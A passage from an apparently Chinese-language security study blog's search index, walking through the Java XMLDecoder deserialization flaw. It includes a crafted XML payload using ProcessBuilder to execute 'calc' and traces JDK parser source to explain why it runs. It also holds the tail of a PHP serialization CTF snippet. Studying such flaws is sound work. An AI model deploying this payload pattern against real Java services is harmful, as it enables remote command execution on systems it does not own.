$para='/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php';}echo serialize(new A());\nPHP\n</code></pre>"},{"location":"web/serialize/java/xmldecoder/","title":"Xmldecoder","text":"<p>XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e</p> <p>\u5b8c\u5168\u4e0d\u4f1a\u5462\uff08\u6307JAVA,XML\u548c\u9898\u76ee\uff09</p> <p>\u4f46\u4e0d\u4f1a\u53ef\u4ee5\u5148\u6765\u590d\u73b0\u3002\u4f7f\u7528\u7684\u5de5\u5177\u662fintelliJ IDEA</p> <p>\u6f0f\u6d1e\u6d41\u7a0b\u6765\u81eahttps://www.cnblogs.com/hetianlab/p/13534535.html</p> <pre><code>package packge;\nimport java.beans.XMLEncoder;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\n\npublic class Test {\n    public static void main(String[] args) throws IOException, InterruptedException {\n        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();\n        map.put(\"123\",\"aaaa\");\n        map.put(\"321\",new ArrayList&lt;&gt;());\n        XMLEncoder xmlEncoder = new XMLEncoder(System.out);\n        xmlEncoder.writeObject(map);\n        xmlEncoder.close();\n    }\n}\n</code></pre> <p></p> <p>\u6211\u4eec\u501f\u52a9PHP\u7684\u53cd\u5e8f\u5217\u5316\u6765\u5b66\u4e60\uff0c\u8fd9\u91cc\u7684Encoder\u76f8\u5f53\u4e8eserilize\uff0c\u800c\u63a5\u4e0b\u6765\u6240\u4f7f\u7528\u5230\u7684Decoder\u76f8\u5f53\u4e8eunserilize</p> <p>\u4f5c\u7528\u6548\u679c\u662f\u5c06map\uff08Map \u63d0\u4f9b\u4e86\u4e00\u4e2a\u66f4\u901a\u7528\u7684\u5143\u7d20\u5b58\u50a8\u65b9\u6cd5\u3002Map \u96c6\u5408\u7c7b\u7528\u4e8e\u5b58\u50a8\u5143\u7d20\u5bf9\uff08\u79f0\u4f5c\u201c\u952e\u201d\u548c\u201c\u503c\u201d\uff09\uff0c\u5176\u4e2d\u6bcf\u4e2a\u952e\u6620\u5c04\u5230\u4e00\u4e2a\u503c\u3002\u4ece\u6982\u5ff5\u4e0a\u800c\u8a00\uff0c\u60a8\u53ef\u4ee5\u5c06  List \u770b\u4f5c\u662f\u5177\u6709\u6570\u503c\u952e\u7684 Map\u3002\u800c\u5b9e\u9645\u4e0a\uff0c\u9664\u4e86 List \u548c Map \u90fd\u5728\u5b9a\u4e49 java.util  \u4e2d\u5916\uff0c\u4e24\u8005\u5e76\u6ca1\u6709\u76f4\u63a5\u7684\u8054\u7cfb\u3002\u672c\u6587\u5c06\u7740\u91cd\u4ecb\u7ecd\u6838\u5fc3 Java \u53d1\u884c\u5957\u4ef6\u4e2d\u9644\u5e26\u7684 Map\uff0c\u540c\u65f6\u8fd8\u5c06\u4ecb\u7ecd\u5982\u4f55\u91c7\u7528\u6216\u5b9e\u73b0\u66f4\u9002\u7528\u4e8e\u60a8\u5e94\u7528\u7a0b\u5e8f\u7279\u5b9a\u6570\u636e\u7684\u4e13\u7528  Map\u3002\uff09</p> <p>\u4e2d\u7684\u952e\u503c\u5b58\u50a8\u5230XML\u6587\u672c\u91cc\uff08\uff1f\uff09</p> <pre><code>package packge;\nimport java.beans.XMLDecoder;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.io.StringBufferInputStream;\npublic class Test {\n    public static void main(String[] args) throws IOException, InterruptedException {\n        String s = \"&lt;java version=\\\"1.8.0_131\\\" class=\\\"java.beans.XMLDecoder\\\"&gt;\\n\" +\n                \" &lt;object class=\\\"java.util.HashMap\\\"&gt;\\n\" +\n                \"  &lt;void method=\\\"put\\\"&gt;\\n\" +\n                \"   &lt;string&gt;123&lt;/string&gt;\\n\" +\n                \"   &lt;string&gt;aaaa&lt;/string&gt;\\n\" +\n                \"  &lt;/void&gt;\\n\" +\n                \"  &lt;void method=\\\"put\\\"&gt;\\n\" +\n                \"   &lt;string&gt;321&lt;/string&gt;\\n\" +\n                \"   &lt;object class=\\\"java.util.ArrayList\\\"/&gt;\\n\" +\n                \"  &lt;/void&gt;\\n\" +\n                \" &lt;/object&gt;\\n\" +\n                \"&lt;/java&gt;\";\n        StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s);\n        XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream);\n        Object o = xmlDecoder.readObject();\n        System.out.println(o);\n    }\n}\n</code></pre> <p></p> <p>\u5c06XML\u4e2d\u7684MAP\u5bf9\u8c61\u63d0\u53d6\u4e86\u51fa\u6765</p> <p>\u5982\u679c\u5bf9xml\u6570\u636e\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u5176\u53d8\u6210\u4e00\u4e2a\u6267\u884c\u547d\u4ee4\u7684\u6570\u636e</p> <pre><code>&lt;java version=\"1.7.0_80\" class=\"java.beans.XMLDecoder\"&gt;\n &lt;object class=\"java.lang.ProcessBuilder\"&gt;\n  &lt;array class=\"java.lang.String\" length=\"1\"&gt;\n    &lt;void index=\"0\"&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/void&gt;\n  &lt;/array&gt;\n  &lt;void method=\"start\"&gt;&lt;/void&gt;\n &lt;/object&gt;\n&lt;/java&gt;\n</code></pre> <p>\u7a0d\u5fae\u4fee\u6539\u9a8c\u8bc1\u4e00\u4e0b\uff1a</p> <p>\u8f93\u51fa\u4e3a</p> <pre><code>java.lang.ProcessBuilder@5e265ba4\n</code></pre> <p>\u5e76\u4e14\u6210\u529f\u6253\u5f00\u4e86\u6211\u7684\u8ba1\u7b97\u5668</p> <p>\u4e5f\u5c31\u662f\u8bf4XMLDecoder\u53cd\u5e8f\u5217\u5316xml\u6570\u636e\u65f6\uff0c\u6570\u636e\u4e2d\u7684\u547d\u4ee4\u662f\u4f1a\u88ab\u6267\u884c\u7684\u3002</p> <p>left+\u5de6\u952e\u6253\u5f00\u51fd\u6570\u4f4d\u7f6e\uff0c\u6253\u4e0a\u65ad\u70b9\u5f00\u59cb\u8c03\u8bd5</p> <p>\u8fdb\u5165191\u884c\u7684parsingCompletes</p> <pre><code>    private boolean parsingComplete() {\n        if (this.input == null) {\n            return false;\n        }\n        if (this.array == null) {\n            if ((this.acc == null) &amp;&amp; (null != System.getSecurityManager())) {\n                throw new SecurityException(\"AccessControlContext is not set\");\n            }\n            AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() {\n                public Void run() {\n                    XMLDecoder.this.handler.parse(XMLDecoder.this.input);\n                    return null;\n                }\n            }, this.acc);\n            this.array = this.handler.getObjects();\n        }\n        return true;\n    }\n</code></pre> <p>\u518d\u8fdb\u5165\u5230parse\u4e2d</p> <pre><code>    public void parse(final InputSource input) {\n        if ((this.acc == null) &amp;&amp; (null != System.getSecurityManager())) {\n            throw new SecurityException(\"AccessControlContext is not set\");\n        }\n        AccessControlContext stack = AccessController.getContext();\n        SharedSecrets.getJavaSecurityAccess().doIntersectionPrivilege(new PrivilegedAction&lt;Void&gt;() {\n            public Void run() {\n                try {\n                    SAXParserFactory.newInstance().newSAXParser().parse(input, DocumentHandler.this);\n                }\n                catch (ParserConfigurationException exception) {\n                    handleException(exception);\n                }\n                catch (SAXException wrapper) {\n                    Exception exception = wrapper.getException();\n                    if (exception == null) {\n                        exception = wrapper;\n                    }\n                    handleException(exception);\n                }\n                catch (IOException exception) {\n                    handleException(exception);\n                }\n                return null;\n            }\n        }, stack, this.acc);\n    }\n</code></pre> <p>\u53c8\u8fdb\u5165\u5230\u53e6\u5916\u4e00\u4e2a\u7c7b\u7684parse\u65b9\u6cd5\u4e4b\u4e2d\uff1a</p> <pre><code>    public void parse(InputSource is, DefaultHandler dh)\n        throws SAXException, IOException {\n        if (is == null) {\n            throw new IllegalArgumentException(\"InputSource cannot be null\");\n        }\n        XMLReader reader = this.getXMLReader();\n        if (dh != null) {\n            reader.setContentHandler(dh);\n            reader.setEntityResolver(dh);\n            reader.setErrorHandler(dh);\n            reader.setDTDHandler(dh);\n        }\n        reader.parse(is);\n    }\n</code></pre> <p>\u8fd9\u91cc\u53c8\u8c03\u7528\u4e86xmlReader\u7236\u7c7bAbstractSAXParser\u7684parser\u65b9\u6cd5\u3002</p> <p></p> <p>\u7ee7\u7eed\u8ddf\u8fdb\u6765\u5230\u8fd9\u91cc\uff0c\u4f46\u548c\u4ed6\u663e\u793a\u7684\u4e0d\u592a\u4e00\u6837</p> <p>\u53d1\u73b0\u5176\u5b9e\u662f\u8981\u8fdb\u4e00\u6b65\u5c55\u5f00\uff08\u56e0\u4e3a\u5b83\u67099\u79cd\u7ee7\u627f\u65b9\u5f0f\uff1f\uff09</p> <pre><code>    public void parse(InputSource inputSource)\n        throws SAXException, IOException {\n        // parse document\n        try {\n            XMLInputSource xmlInputSource =\n                new XMLInputSource(inputSource.getPublicId(),\n                                   inputSource.getSystemId(),\n                                   null, false);\n            xmlInputSource.setByteStream(inputSource.getByteStream());\n            xmlInputSource.setCharacterStream(inputSource.getCharacterStream());\n            xmlInputSource.setEncoding(inputSource.getEncoding());\n            parse(xmlInputSource);\n        }\n        // wrap XNI exceptions as SAX exceptions\n        catch (XMLParseException e) {\n            Exception ex = e.getException();\n            if (ex == null || ex instanceof CharConversionException) {\n                // must be a parser exception; mine it for locator info and throw\n                // a SAXParseException\n                LocatorImpl locatorImpl = new LocatorImpl() {\n                    public String getXMLVersion() {\n                        return fVersion;\n                    }\n                    // since XMLParseExceptions know nothing about encoding,\n                    // we cannot return anything meaningful in this context.\n                    // We *could* consult the LocatorProxy, but the\n                    // application can do this itself if it wishes to possibly\n                    // be mislead.\n                    public String getEncoding() {\n                        return null;\n                    }\n                };\n                locatorImpl.setPublicId(e.getPublicId());\n                locatorImpl.setSystemId(e.getExpandedSystemId());\n                locatorImpl.setLineNumber(e.getLineNumber());\n                locatorImpl.setColumnNumber(e.getColumnNumber());\n                throw (ex == null) ?\n                        new SAXParseException(e.getMessage(), locatorImpl) :\n                        new SAXParseException(e.getMessage(), locatorImpl, ex);\n            }\n            if (ex instanceof SAXException) {\n                // why did we create an XMLParseException?\n                throw (SAXException)ex;\n            }\n            if (ex instanceof IOException) {\n                throw (IOException)ex;\n            }\n            throw new SAXException(ex);\n        }\n        catch (XNIException e) {\n            Exception ex = e.getException();\n            if (ex == null) {\n                throw new SAXException(e.getMessage());\n            }\n            if (ex instanceof SAXException) {\n                throw (SAXException)ex;\n            }\n            if (ex instanceof IOException) {\n                throw (IOException)ex;\n            }\n            throw new SAXException(ex);\n        }\n    }\n</code></pre> <p>\u518d\u6b21\u8ddf\u8fdb\uff1a</p> <pre><code>public void parse(XMLInputSource inputSource)\nthrows XNIException, IOException;\n\u7ee7\u7eed\u5c55\u5f00\uff1a\npublic void parse(XMLInputSource source) throws XNIException, IOException {\n    if (fParseInProgress) {\n        // REVISIT - need to add new error message\n        throw new XNIException(\"FWK005 parse may not be called while parsing.\");\n    }\n    fParseInProgress = true;\n    try {\n        setInputSource(source);\n        parse(true);\n    } catch (XNIException ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw ex;\n    } catch (IOException ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw ex;\n    } catch (RuntimeException ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw ex;\n    } catch (Exception ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw new XNIException(ex);\n    } finally {\n        fParseInProgress = false;\n        // close all streams opened by xerces\n        this.cleanup();\n    }\n} // parse(InputSource)\n</code></pre> <p>\u6700\u540e\u8fdb\u5165\u4e86XML11Configuration\u7c7b\u7684parse\u65b9\u6cd5\u3002</p>"},{"location":"web/serialize/java/xmldecoder/#_1","title":"Xmldecoder","text":"<p>\u4ee5\u4e0a\u662fXML\u5904\u7406\u4e4b\u524d\u7684\u51fd\u6570\u5904\u7406</p> <p>XML\u6570\u636e\u7684\u5904\u7406\uff1a</p> <p>\u518d\u7ee7\u7eed\u8ddf\u8fdbXML11Configration</p> <p>\u4e0b\u9762\u7684\u51fd\u6570\u662f\uff1a</p> <pre><code>public boolean parse(boolean complete) throws XNIException, IOException {\n    //\n    // reset and configure pipeline and set InputSource.\n    if (fInputSource != null) {\n        try {\n            fValidationManager.reset();\n            fVersionDetector.reset(this);\n            fConfigUpdated = true;\n            resetSymbolTable();\n            resetCommon();\n            short version = fVersionDetector.determineDocVersion(fInputSource);\n            if (version == Constants.XML_VERSION_1_1) {\n                initXML11Components();\n                configureXML11Pipeline();\n                resetXML11();\n            } else {\n                configurePipeline();\n                reset();\n            }\n            // mark configuration as fixed\n            fConfigUpdated = false;\n            // resets and sets the pipeline.\n            fVersionDetector.startDocumentParsing((XMLEntityHandler) fCurrentScanner, version);\n            fInputSource = null;\n        } catch (IOException | RuntimeException ex) {\n            if (PRINT_EXCEPTION_STACK_TRACE)\n                ex.printStackTrace();\n            throw ex;\n        } catch (Exception ex) {\n            if (PRINT_EXCEPTION_STACK_TRACE)\n                ex.printStackTrace();\n            throw new XNIException(ex);\n        }\n    }\n    try {\n        return fCurrentScanner.scanDocument(complete);\n    } catch (IOException | RuntimeException ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw ex;\n    } catch (Exception ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw new XNIException(ex);\n    }\n}\n</code></pre> <p>\u5173\u6ce8\u70b9\u5728scanDocument\u5185</p> <p>\u51fd\u6570\u6709\u5f88\u591a\u5bf9XML\u683c\u5f0f\u7684\u89e3\u6790\u8fc7\u7a0b</p> <pre><code>public boolean scanDocument(boolean complete)\nthrows IOException, XNIException {\n    // keep dispatching \"events\"\n    fEntityManager.setEntityHandler(this);\n    //System.out.println(\" get Document Handler in NSDocumentHandler \" + fDocumentHandler );\n    int event = next();\n    do {\n        switch (event) {\n            case XMLStreamConstants.START_DOCUMENT :\n                //fDocumentHandler.startDocument(fEntityManager.getEntityScanner(),fEntityManager.getEntityScanner().getVersion(),fNamespaceContext,null);// not able to get\n                break;\n            case XMLStreamConstants.START_ELEMENT :\n                //System.out.println(\" in scann element\");\n                //fDocumentHandler.startElement(getElementQName(),fAttributes,null);\n                break;\n            case XMLStreamConstants.CHARACTERS :\n                fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                fDocumentHandler.characters(getCharacterData(),null);\n                break;\n            case XMLStreamConstants.SPACE:\n                //check if getCharacterData() is the right function to retrieve ignorableWhitespace information.\n                //System.out.println(\"in the space\");\n                //fDocumentHandler.ignorableWhitespace(getCharacterData(), null);\n                break;\n            case XMLStreamConstants.ENTITY_REFERENCE :\n                fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                //entity reference callback are given in startEntity\n                break;\n            case XMLStreamConstants.PROCESSING_INSTRUCTION :\n                fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                fDocumentHandler.processingInstruction(getPITarget(),getPIData(),null);\n                break;\n            case XMLStreamConstants.COMMENT :\n                fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                fDocumentHandler.comment(getCharacterData(),null);\n                break;\n            case XMLStreamConstants.DTD :\n                //all DTD related callbacks are handled in DTDScanner.\n                //1. Stax doesn't define DTD states as it does for XML Document.\n                //therefore we don't need to take care of anything here. So Just break;\n                break;\n            case XMLStreamConstants.CDATA:\n               fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                if (fCDataStart) {\n                    fDocumentHandler.startCDATA(null);\n                    fCDataStart = false;\n                    fInCData = true;\n                }\n                fDocumentHandler.characters(getCharacterData(),null);\n                if (fCDataEnd) {\n                    fDocumentHandler.endCDATA(null);\n                    fCDataEnd = false;\n                }\n                break;\n            case XMLStreamConstants.NOTATION_DECLARATION :\n                break;\n            case XMLStreamConstants.ENTITY_DECLARATION :\n                break;\n            case XMLStreamConstants.NAMESPACE :\n                break;\n            case XMLStreamConstants.ATTRIBUTE :\n                break;\n            case XMLStreamConstants.END_ELEMENT :\n                //do not give callback here.\n                //this callback is given in scanEndElement function.\n                //fDocumentHandler.endElement(getElementQName(),null);\n                break;\n            default :\n                // Errors should have already been handled by the Scanner\n                return false;\n        }\n        //System.out.println(\"here in before calling next\");\n        event = next();\n        //System.out.println(\"here in after calling next\");\n    } while (event!=XMLStreamConstants.END_DOCUMENT &amp;&amp; complete);\n    if(event == XMLStreamConstants.END_DOCUMENT) {\n        fDocumentHandler.endDocument(null);\n        return false;\n    }\n    return true;\n} \n</code></pre> <p>\u7136\u540e\u8fdbnext()</p> <p>\u5230\u8fd9\u91cc\uff1a</p> <pre><code>public int next() throws IOException, XNIException {\n    return fDriver.next();\n}\n    public int next() throws IOException, XNIException {\n        try {\n            do {\n                switch (fScannerState) {\n                    case SCANNER_STATE_PROLOG: {\n                        fEntityScanner.skipSpaces();\n                        if (fEntityScanner.skipChar('&lt;', null)) {\n                            setScannerState(SCANNER_STATE_START_OF_MARKUP);\n                        } else if (fEntityScanner.skipChar('&amp;', NameType.REFERENCE)) {\n                            setScannerState(SCANNER_STATE_REFERENCE);\n                        } else {\n                            setScannerState(SCANNER_STATE_CONTENT);\n                        }\n                        break;\n                    }\n                    case SCANNER_STATE_START_OF_MARKUP: {\n                        fMarkupDepth++;\n                        if (isValidNameStartChar(fEntityScanner.peekChar()) ||\n                                isValidNameStartHighSurrogate(fEntityScanner.peekChar())) {\n                            setScannerState(SCANNER_STATE_ROOT_ELEMENT);\n                            setDriver(fContentDriver);\n                            //from now onwards this would be handled by fContentDriver,in the same next() call\n                            return fContentDriver.next();\n                        } else if (fEntityScanner.skipChar('!', null)) {\n                            if (fEntityScanner.skipChar('-', null)) {\n                                if (!fEntityScanner.skipChar('-', null)) {\n                                    reportFatalError(\"InvalidCommentStart\",\n                                            null);\n                                }\n                                setScannerState(SCANNER_STATE_COMMENT);\n                            } else if (fEntityScanner.skipString(DOCTYPE)) {\n                                setScannerState(SCANNER_STATE_DOCTYPE);\n                                Entity entity = fEntityScanner.getCurrentEntity();\n                                if(entity instanceof Entity.ScannedEntity){\n                                    fStartPos=((Entity.ScannedEntity)entity).position;\n                                }\n                                fReadingDTD=true;\n                                if(fDTDDecl == null)\n                                    fDTDDecl = new XMLStringBuffer();\n                                fDTDDecl.append(\"&lt;!DOCTYPE\");\n                            } else {\n                                reportFatalError(\"MarkupNotRecognizedInProlog\",\n                                        null);\n                            }\n                        } else if (fEntityScanner.skipChar('?', null)) {\n                            setScannerState(SCANNER_STATE_PI);\n                        } else {\n                            reportFatalError(\"MarkupNotRecognizedInProlog\",\n                                    null);\n                        }\n                        break;\n                    }\n                }\n            } while (fScannerState == SCANNER_STATE_PROLOG || fScannerState == SCANNER_STATE_START_OF_MARKUP );\n            switch(fScannerState){\n                /**\n                //this part is handled by FragmentContentHandler\n                case SCANNER_STATE_ROOT_ELEMENT: {\n                    //we have read '&lt;' and beginning of reading the start element tag\n                    setScannerState(SCANNER_STATE_START_ELEMENT_TAG);\n                    setDriver(fContentDriver);\n                    //from now onwards this would be handled by fContentDriver,in the same next() call\n                    return fContentDriver.next();\n                }\n                 */\n                case SCANNER_STATE_COMMENT: {\n                    //this function fills the data..\n                    scanComment();\n                    setScannerState(SCANNER_STATE_PROLOG);\n                    return XMLEvent.COMMENT;\n                    //setScannerState(SCANNER_STATE_PROLOG);\n                    //break;\n                }\n                case SCANNER_STATE_PI: {\n                    fContentBuffer.clear() ;\n                    scanPI(fContentBuffer);\n                    setScannerState(SCANNER_STATE_PROLOG);\n                    return XMLEvent.PROCESSING_INSTRUCTION;\n                }\n                case SCANNER_STATE_DOCTYPE: {\n                    if (fDisallowDoctype) {\n                        reportFatalError(\"DoctypeNotAllowed\", null);\n                    }\n                    if (fSeenDoctypeDecl) {\n                        reportFatalError(\"AlreadySeenDoctype\", null);\n                    }\n                    fSeenDoctypeDecl = true;\n                    // scanDoctypeDecl() sends XNI doctypeDecl event that\n                    // in SAX is converted to startDTD() event.\n                    if (scanDoctypeDecl(fSupportDTD)) {\n                        //allow parsing of entity decls to continue in order to stay well-formed\n                        setScannerState(SCANNER_STATE_DTD_INTERNAL_DECLS);\n                        fSeenInternalSubset = true;\n                        if(fDTDDriver == null){\n                            fDTDDriver = new DTDDriver();\n                        }\n                        setDriver(fContentDriver);\n                        //always return DTD event, the event however, will not contain any entities\n                        return fDTDDriver.next();\n                    }\n                    if(fSeenDoctypeDecl){\n                        Entity entity = fEntityScanner.getCurrentEntity();\n                        if(entity instanceof Entity.ScannedEntity){\n                            fEndPos = ((Entity.ScannedEntity)entity).position;\n                        }\n                        fReadingDTD = false;\n                    }\n                    // handle external subset\n                    if (fDoctypeSystemId != null) {\n                        if (((fValidation || fLoadExternalDTD)\n                            &amp;&amp; (fValidationManager == null || !fValidationManager.isCachedDTD()))) {\n                            if (fSupportDTD) {\n                                setScannerState(SCANNER_STATE_DTD_EXTERNAL);\n                            } else {\n                                setScannerState(SCANNER_STATE_PROLOG);\n                            }\n                            setDriver(fContentDriver);\n                            if(fDTDDriver == null) {\n                                fDTDDriver = new DTDDriver();\n                            }\n                            return fDTDDriver.next();\n                        }\n                    }\n                    else if (fExternalSubsetSource != null) {\n                        if (((fValidation || fLoadExternalDTD)\n                            &amp;&amp; (fValidationManager == null || !fValidationManager.isCachedDTD()))) {\n                            // This handles the case of a DOCTYPE that had neither an internal subset or an external subset.\n                            fDTDScanner.setInputSource(fExternalSubsetSource);\n                            fExternalSubsetSource = null;\n                        if (fSupportDTD)\n                            setScannerState(SCANNER_STATE_DTD_EXTERNAL_DECLS);\n                        else\n                            setScannerState(SCANNER_STATE_PROLOG);\n                        setDriver(fContentDriver);\n                        if(fDTDDriver == null)\n                            fDTDDriver = new DTDDriver();\n                        return fDTDDriver.next();\n                        }\n                    }\n                    // Send endDTD() call if:\n                    // a) systemId is null or if an external subset resolver could not locate an external subset.\n                    // b) \"load-external-dtd\" and validation are false\n                    // c) DTD grammar is cached\n                    // in XNI this results in 3 events:  doctypeDecl, startDTD, endDTD\n                    // in SAX this results in 2 events: startDTD, endDTD\n                    if (fDTDScanner != null) {\n                        fDTDScanner.setInputSource(null);\n                    }\n                    setScannerState(SCANNER_STATE_PROLOG);\n                    return XMLEvent.DTD;\n                }\n                case SCANNER_STATE_CONTENT: {\n                    reportFatalError(\"ContentIllegalInProlog\", null);\n                    fEntityScanner.scanChar(null);\n                    return -1;\n                }\n                case SCANNER_STATE_REFERENCE: {\n                    reportFatalError(\"ReferenceIllegalInProlog\", null);\n                    return -1;\n                }\n                /**\n                 * if (complete) {\n                 * if (fEntityScanner.scanChar() != '&lt;') {\n                 * reportFatalError(\"RootElementRequired\", null);\n                 * }\n                 * setScannerState(SCANNER_STATE_ROOT_ELEMENT);\n                 * setDriver(fContentDriver);\n                 * }\n                 */\n            }\n        }\n        // encoding errors\n        catch (MalformedByteSequenceException e) {\n            fErrorReporter.reportError(e.getDomain(), e.getKey(),\n                    e.getArguments(), XMLErrorReporter.SEVERITY_FATAL_ERROR, e);\n            return -1;\n        } catch (CharConversionException e) {\n            fErrorReporter.reportError(\n                    XMLMessageFormatter.XML_DOMAIN,\n                    \"CharConversionFailure\",\n                    null,\n                    XMLErrorReporter.SEVERITY_FATAL_ERROR, e);\n            return -1;\n        }\n        // premature end of file\n        catch (EOFException e) {\n            reportFatalError(\"PrematureEOF\", null);\n            //xxx  what should be returned here.... ???\n            return -1 ;\n            //throw e;\n        }\n        //xxx  what should be returned here.... ???\n        return -1;\n    }\n\n} // class PrologDriver\n</code></pre> <p>\u5e94\u8be5\u662f\u8fdb\u5165\u8fd9\u4e2a\u4f4d\u7f6e</p> <p>\u7136\u540e\u63a8\u8350\u8bbe\u4e2a\u65ad\u70b9\u5728\u8fdb\u51fd\u6570\u7684\u5f00\u59cb\u5904\uff0c\u56e0\u4e3a\u5176\u4e2d\u4f1a\u6709\u4e00\u4e2anext()\u5faa\u73af\u4f1a\u5faa\u73af\u975e\u5e38\u591a\u6b21\uff0813\u6b21\u5de6\u53f3\uff09\uff0c\u8981\u5728\u5f39\u51fa\u6765\u4e4b\u524d\uff08\u6307\u90a3\u4e2a\u8ba1\u7b97\u5668\uff09\u4f1a\u89c1\u5230\u8fd9\u6837\u4e00\u4e2a\u51fd\u6570\u65b9\u6cd5\uff1a</p> <p>.png)</p> <p>\u7ee7\u7eed\u8ddf\u8fdb\uff1a</p> <p></p> <p>\u7ec8\u4e8e\u627e\u5230\u4e86endElement\u65b9\u6cd5\u3002</p> <p>\u7f51\u56fe\u8fd9\u6bb5\u4ee3\u7801\u7684\u903b\u8f91\uff1a</p> <p></p> <p>\u5355\u6b65\u8c03\u8bd5\u6765\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u5728AbstractSAXParser\u7c7b\u4e4b\u4e0b</p> <pre><code>public void endElement(QName element, Augmentations augs) throws XNIException {\n\n    try {\n        // SAX1\n        if (fDocumentHandler != null) {\n            fDocumentHandler.endElement(element.rawname);\n        }\n        // SAX2\n        if (fContentHandler != null) {\n            fAugmentations = augs;\n            String uri = element.uri != null ? element.uri : \"\";\n            String localpart = fNamespaces ? element.localpart : \"\";\n            fContentHandler.endElement(uri, localpart,\n                                       element.rawname);\n            if (fNamespaces) {\n                endNamespaceMapping();\n            }\n        }\n    }\n    catch (SAXException e) {\n        throw new XNIException(e);\n    }\n} // endElement(QName)\n</code></pre> <p>\u7ee7\u7eedF7\u5355\u6b65\u8c03\u8bd5\u6765\u5230\u8fd9\u91cc\uff1a</p> <pre><code>public void endElement(String uri, String localName, String qName) {\n    try {\n        this.handler.endElement();\n    }\n    catch (RuntimeException exception) {\n        handleException(exception);\n    }\n    finally {\n        this.handler = this.handler.getParent();\n    }\n}\n</code></pre> <p>\u63a5\u4e0b\u6765\u5c31\u4e0d\u662f\u5355\u6b65\u8c03\u8bd5\u4e86</p> <p>\u70b9\u8fdb\u53bb</p> <p>\u8fd9\u91cc\u7684handler\u662fStringElementHandler\uff0c\u4f46\u662f\u8fd9\u4e2a\u7c7b\u6ca1\u6709\u91cd\u5199endElement\u65b9\u6cd5\uff0c\u6240\u4ee5\u8c03\u7528\u7684\u662f\u7236\u7c7bElementHandler\u7684endElement\u65b9\u6cd5\uff0c\u5176\u4e2d\u8c03\u7528\u4e86getValueObject\u6765\u83b7\u53d6\u6807\u7b7e\u4e2d\u7684value\u503c\uff0c\u8fd9\u91cc\u7684\u6807\u7b7e\u662fstring\u6807\u7b7e\uff0c\u6240\u4ee5\u83b7\u53d6\u5230\u7684\u503c\u662fcalc\u3002</p> <p>\u4e5f\u5c31\u662f\u7236\u7c7b\u7684</p> <pre><code>public void endElement() {\n    // do nothing if no value returned\n    ValueObject value = getValueObject();\n    if (!value.isVoid()) {\n        if (this.id != null) {\n            this.owner.setVariable(this.id, value.getValue());\n        }\n        if (isArgument()) {\n            if (this.parent != null) {\n                this.parent.addArgument(value.getValue());\n            } else {\n                this.owner.addObject(value.getValue());\n            }\n        }\n    }\n}\n</code></pre> <p>\u7136\u540e\u5c06\u5176\u6dfb\u52a0\u5230\u5176\u7236\u7c7b\u6807\u7b7eVoidElementHandler\u7684Argument\u5c5e\u6027\u4e2d\u3002</p> <p>\u7136\u540e\u5c06handler\u6307\u5411\u5176\u7236\u7c7bVoidElementHandler\u3002</p> <pre><code>ValueObject value = getValueObject();\n</code></pre> <p>\u7ee7\u7eed\u89e3\u6790\u5230void\u6807\u7b7e\uff0c\u6b64\u65f6\u7684handler\u5c31\u662fVoidElementHandler\uff0c\u63a5\u7740\u8c03\u7528getValueObject\u3002\u4f46\u662f\u56e0\u4e3a\u6ca1\u6709\u91cd\u5199\u8be5\u65b9\u6cd5\uff0c\u6240\u4ee5\u8c03\u7528\u7236\u7c7bNewElementHandler\u7684getValueObject\u3002</p> <p>\u7ee7\u7eed\u8ddf\u8fdb\u53d1\u73b0\u5b9e\u73b0\u4e86\u53cd\u5c04\u8c03\u7528invoke\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u6267\u884c\u4e86set\u65b9\u6cd5\u3002\u63a5\u7740\u518d\u89e3\u6790Array\u6807\u7b7e\uff0c\u6309\u7167\u4e0a\u9762\u7684\u6b65\u9aa4\u89e3\u6790\uff0c\u5c31\u5b8c\u6210\u4e86\u8fd9\u4e00\u90e8\u5206\u53c2\u6570\u7684\u89e3\u6790\u3002</p> <p></p> <p></p> <p></p> <pre><code>&lt;array class=\"java.lang.String\"length=\"1\"&gt;\n  &lt;void index=\"0\"&gt;\n      &lt;string&gt;calc&lt;/string&gt;\n  &lt;/void&gt;\n&lt;/array&gt;\n</code></pre> <p>\u90a3\u4e48\u518d\u6309\u7167\u4e0a\u9762\u7684\u6b65\u9aa4\u89e3\u6790object\u6807\u7b7e\uff0c\u7136\u540e\u8c03\u7528new \u65b9\u6cd5\u5b9e\u4f8b\u5316 ProcessBuilder\u7c7b\u3002</p> <p>\u7136\u540e\u89e3\u6790\u5230void\u6807\u7b7e\u83b7\u53d6\u5230start\u65b9\u6cd5\uff0c\u7136\u540e\u901a\u8fc7\u8c03\u7528start\u65b9\u6cd5\u5b9e\u73b0\u4e86\u547d\u4ee4\u6267\u884c\uff0c\u5f39\u51fa\u8ba1\u7b97\u5668\u3002</p> <p>\u4e5f\u5c31\u76f8\u5f53\u4e8e\u6700\u540e\u62fc\u63a5\u4e86 new java.lang.ProcessBuilder(new String[]{\"calc\"}).start();</p> <p></p> <p>\u6700\u540e\u6765\u6574\u7406\u4e00\u4e0b\uff1a</p> 